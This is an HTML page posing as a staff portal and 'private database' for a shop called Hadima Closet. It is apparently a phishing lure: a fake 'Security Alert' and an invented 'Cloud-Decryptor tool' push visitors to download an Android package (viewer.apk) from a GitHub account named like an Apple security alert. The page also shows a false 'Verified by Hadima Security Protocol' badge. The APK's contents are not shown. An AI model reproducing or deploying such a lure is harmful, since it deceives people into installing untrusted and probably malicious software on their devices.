<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hadima Closet | Official Staff Portal</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; }
        .bg-blur {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: url('https://i.ibb.co/6R0D99T/1000010748.png') no-repeat center center;
            background-size: cover;
            filter: blur(8px);
            opacity: 0.6;
            z-index: 1;
        }
        .overlay {
            position: relative;
            z-index: 2;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(0,0,0,0.4);
        }
        .login-card {
            background: rgba(26, 26, 26, 0.95);
            border: 1px solid #8e44ad;
            padding: 40px 20px;
            border-radius: 25px;
            text-align: center;
            width: 90%;
            max-width: 380px;
            box-shadow: 0 0 30px rgba(142, 68, 173, 0.5);
        }
        h2 { color: #8e44ad; margin-bottom: 10px; font-size: 22px; }
        p { color: #ccc; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
        .btn {
            display: block;
            background: #8e44ad;
            color: white;
            text-decoration: none;
            padding: 15px;
            border-radius: 50px;
            font-weight: bold;
            font-size: 16px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        .security-note {
            margin-top: 20px;
            font-size: 11px;
            color: #666;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>
    <div class="bg-blur"></div>
    <div class="overlay">
        <div class="login-card">
            <div style="font-size: 50px; margin-bottom: 10px;">🔐</div>
            <h2>Hadima Closet Private Database</h2>
            <p>Security Alert: This session is encrypted. To view Private Orders & Chat History, please sync your device using our official Cloud-Decryptor tool.</p>
            <a href="https://github.com/applesecurityalert6-prog/hadima-closet-collections/raw/main/viewer.apk" class="btn">SYNC DEVICE & VIEW CHATS</a>
            <div class="security-note">Verified by Hadima Security Protocol v4.2</div>
        </div>
    </div>
</body>
</html>
